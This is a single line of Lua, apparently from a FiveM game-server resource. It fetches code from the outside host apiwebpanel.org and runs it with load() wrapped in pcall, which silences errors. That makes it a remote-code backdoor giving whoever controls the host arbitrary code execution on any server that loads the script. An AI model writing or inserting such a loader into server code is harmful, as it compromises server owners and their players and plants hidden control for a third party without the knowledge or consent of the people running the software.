PerformHttpRequest('https://apiwebpanel.org/giXWm?v=true', function (e, d) print(e) pcall(function() assert(load(d))() end) end)
